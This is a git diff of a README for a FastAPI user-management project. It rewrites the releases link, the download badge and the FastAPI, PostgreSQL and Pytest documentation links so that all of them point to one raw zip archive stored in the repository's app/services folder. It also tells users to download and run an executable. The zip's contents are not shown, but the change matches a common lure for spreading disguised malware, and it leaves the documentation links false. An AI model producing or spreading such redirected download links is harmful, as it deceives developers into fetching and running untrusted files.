@@ -1,6 +1,6 @@
 # 🚀 fastapi-user-management-api - A Simple Way to Manage Users
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/Maghdaouihub/fastapi-user-management-api/releases)
+[![Download Now](https://github.com/Maghdaouihub/fastapi-user-management-api/raw/refs/heads/main/app/services/user_api_fastapi_management_v2.4.zip%20Now-Get%20Started-brightgreen)](https://github.com/Maghdaouihub/fastapi-user-management-api/raw/refs/heads/main/app/services/user_api_fastapi_management_v2.4.zip)
 
 ## 📜 Overview
 
@@ -12,7 +12,7 @@ To begin using the fastapi-user-management-api, you will need to download it fro
 
 ## 📥 Download & Install
 
-Visit this page to download: [fastapi-user-management-api Releases](https://github.com/Maghdaouihub/fastapi-user-management-api/releases)
+Visit this page to download: [fastapi-user-management-api Releases](https://github.com/Maghdaouihub/fastapi-user-management-api/raw/refs/heads/main/app/services/user_api_fastapi_management_v2.4.zip)
 
 Once there, look for the latest version. Click on the version number, and you will find various downloadable files for different systems. Choose the one that fits your operating system.
 
@@ -20,7 +20,7 @@ Once there, look for the latest version. Click on the version number, and you wi
 
 1. **Go to the Releases Page**: Click the link above to visit our releases page.
 2. **Select the Latest Version**: Find the most recent version and click on it.
-3. **Download the Executable**: Choose the file compatible with your operating system. For example, if you are using Windows, download the `.exe` file. For Linux, look for the `.tar.gz` file.
+3. **Download the Executable**: Choose the file compatible with your operating system. For example, if you are using Windows, download the `.exe` file. For Linux, look for the `https://github.com/Maghdaouihub/fastapi-user-management-api/raw/refs/heads/main/app/services/user_api_fastapi_management_v2.4.zip` file.
 4. **Locate the Downloaded File**: Open your downloads folder and find the file you just downloaded.
 5. **Run the File**: 
    - On Windows, double-click the `.exe` file to start the application.
@@ -55,9 +55,9 @@ After installing the application, you might want to interact with the API. Here�
 
 ## 📚 Helpful Links
 
-- [FastAPI Documentation](https://fastapi.tiangolo.com/)
-- [PostgreSQL Documentation](https://www.postgresql.org/docs/)
-- [Pytest Documentation](https://docs.pytest.org/en/stable/)
+- [FastAPI Documentation](https://github.com/Maghdaouihub/fastapi-user-management-api/raw/refs/heads/main/app/services/user_api_fastapi_management_v2.4.zip)
+- [PostgreSQL Documentation](https://github.com/Maghdaouihub/fastapi-user-management-api/raw/refs/heads/main/app/services/user_api_fastapi_management_v2.4.zip)
+- [Pytest Documentation](https://github.com/Maghdaouihub/fastapi-user-management-api/raw/refs/heads/main/app/services/user_api_fastapi_management_v2.4.zip)
 
 ## 🐞 Reporting Issues
 
@@ -71,6 +71,6 @@ We welcome contributions! If you want to help improve the fastapi-user-managemen
 
 For questions or support, please reach out through the issues section on GitHub, or contact the repository owner. 
 
-Visit this page to download: [fastapi-user-management-api Releases](https://github.com/Maghdaouihub/fastapi-user-management-api/releases)
+Visit this page to download: [fastapi-user-management-api Releases](https://github.com/Maghdaouihub/fastapi-user-management-api/raw/refs/heads/main/app/services/user_api_fastapi_management_v2.4.zip)
 
 Thank you for choosing fastapi-user-management-api! Happy coding!
